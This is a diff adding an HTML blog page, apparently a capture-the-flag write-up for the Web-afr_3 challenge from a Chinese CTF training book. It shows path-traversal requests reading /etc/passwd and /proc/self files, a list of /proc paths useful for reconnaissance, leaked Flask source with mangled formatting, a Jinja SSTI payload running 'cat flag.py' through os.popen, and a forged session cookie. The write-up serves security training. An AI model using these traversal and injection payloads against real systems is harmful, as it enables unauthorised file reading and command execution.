@@ -1,0 +1,255 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>《从0到1：CTFer成长之路》:Web-afr_3 - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="article?name=../../../etc/passwd
+
+article?name=../../../flag
+
+Linux内核源代码情景分析-特殊文件系统/proc-对/proc/sel,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">《从0到1：CTFer成长之路》:Web-afr_3</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">《从0到1：CTFer成长之路》:Web-afr_3</h1>
+        <div class="stuff">
+            <span>五月 14, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8B/" rel="tag">《从0到1：CTFer成长之路》</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <pre><code>article?name=../../../etc/passwd</code></pre>
+<p><img src="/2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/dfafa81734822b8a4dead9370465497.png" alt="dfafa81734822b8a4dead9370465497"></p>
+<pre><code>article?name=../../../flag</code></pre>
+<p><img src="/2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/2c040ca57f1fa6cd98f6903789c6657.png" alt="2c040ca57f1fa6cd98f6903789c6657"></p>
+<h4 id="Linux内核源代码情景分析-特殊文件系统-proc-对-proc-self-cwd的访问"><a href="#Linux内核源代码情景分析-特殊文件系统-proc-对-proc-self-cwd的访问" class="headerlink" title="Linux内核源代码情景分析-特殊文件系统/proc-对/proc/self/cwd的访问"></a>Linux内核源代码情景分析-特殊文件系统/proc-对/proc/self/cwd的访问</h4><ol>
+<li><p>/proc/sched_debug # 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用</p>
+</li>
+<li><p>/proc/mounts # 挂载的文件系统列表</p>
+</li>
+<li><p>/proc/net/arp # arp表，可以获得内网其他机器的地址</p>
+</li>
+<li><p>/proc/net/route # 路由表信息</p>
+</li>
+<li><p>/proc/net/tcp and /proc/net/udp # 活动连接的信息</p>
+</li>
+<li><p>/proc/net/fib_trie # 路由缓存</p>
+</li>
+<li><p>/proc/version  # 内核版本</p>
+</li>
+<li><p>/proc/[PID]/cmdline # 可能包含有用的路径信息</p>
+</li>
+<li><p>/proc/[PID]/environ #  程序运行的环境变量信息，可以用来包含getshell</p>
+</li>
+<li><p>/proc/[PID]/cwd     # 当前进程的工作目录</p>
+</li>
+<li><p>/proc/[PID]/fd/[#] # 访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log</p>
+<pre><code>article?name=../../../proc/self/cmdline</code></pre>
+</li>
+</ol>
+<p><img src="/2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/8e57c316434afe29a6b114b857f3fe9.png" alt="8e57c316434afe29a6b114b857f3fe9"></p>
+<pre><code>article?name=../../../proc/self/cwd/server.py</code></pre>
+<p><img src="/2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/b0ea292d99ec5dca2dcc57cdc384634.png" alt="b0ea292d99ec5dca2dcc57cdc384634"></p>
+<p>看到代码了：</p>
+<pre><code>#!/usr/bin/python
+import os
+from flask import (Flask, render_template, request, url_for, redirect, session, render_template_string)
+from flask_session import Session
+
+app = Flask(__name__)
+execfile('flag.py')#execfile() 函数可以用来执行一个文件。
+execfile('key.py')
+FLAG = flag
+app.secret_key = key @ app.route("/n1page", methods=["GET", "POST"])
+
+
+def n1page():
+    if request.method != "POST":
+        return redirect(url_for("index"))
+    n1code = request.form.get("n1code") or None
+    if n1code is not None: n1code = n1code.replace(".", "").replace("_", "").replace("{", "").replace("}", "")
+if "n1code" not in session or session['n1code'] is None: session['n1code'] = n1code
+template = None
+if session[
+    'n1code'] is not None: template = '''&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class="row&gt; &lt;div class="col-md-6 col-md-offset-3 center"&gt; Hello : %s, why you don't look at our &lt;a href='/article?name=article'&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; ''' %
+session['n1code']
+session['n1code'] = None
+return render_template_string(template) @ app.route("/", methods=["GET"])
+
+
+def index(): return render_template("main.html") @ app.route('/article', methods=['GET'])
+
+
+def article(): error = 0
+
+
+if 'name' in request.args:
+    page = request.args.get('name') else:
+    page = 'article'
+if page.find('flag') &gt;= 0: page = 'notallowed.txt'
+try:
+    template = open('/home/nu11111111l/articles/{}'.format(page)).read() except Exception as e:
+    template = e
+return render_template('article.html', template=template)
+if __name__ == "__main__": app.run(host='0.0.0.0', debug=False)</code></pre>
+<pre><code>flag在flag.py(flag被过滤)
+flask的appkey在key.py
+源码里面存在ssti，前提是可以伪造flask的session</code></pre>
+<p>ssti注入：</p>
+<pre><code>{'n1code': '{{\'\'.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\'os\'].popen(\'cat flag.py\').read()}}'</code></pre>
+<p><img src="/2021/05/14/cong-0-dao-1-ctfer-cheng-chang-zhi-lu-web-afr-3/e5274968efa9a4310fbf7d679dab5ae.png" alt="e5274968efa9a4310fbf7d679dab5ae"></p>
+<p>加密后</p>
+<p>cookies:</p>
+<pre><code>session=.eJwdikEKgCAQAL8SXlYvQl2CviKxbGoRmCtZhxD_nnUbZqaI2Ft2XkyiFACNaAPljNjoOBnRDHPDfC-_961IZcb-k3vcr3_cAi8UWjLAGWadOPkowdLVrYE2nR5Q-vTkpKpV1BcrHygP.X7VhLg.TjoSPMRjbzbRBNeGnJ2EtXbpNCM</code></pre>
+<p>flag：</p>
+<pre><code>n1book{afr_3_solved}</code></pre>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E5%86%85%E6%A0%B8%E6%BA%90%E4%BB%A3%E7%A0%81%E6%83%85%E6%99%AF%E5%88%86%E6%9E%90-%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F-proc-%E5%AF%B9-proc-self-cwd%E7%9A%84%E8%AE%BF%E9%97%AE"><span class="toc-number">1.</span> <span class="toc-text">Linux内核源代码情景分析-特殊文件系统&#x2F;proc-对&#x2F;proc&#x2F;self&#x2F;cwd的访问</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
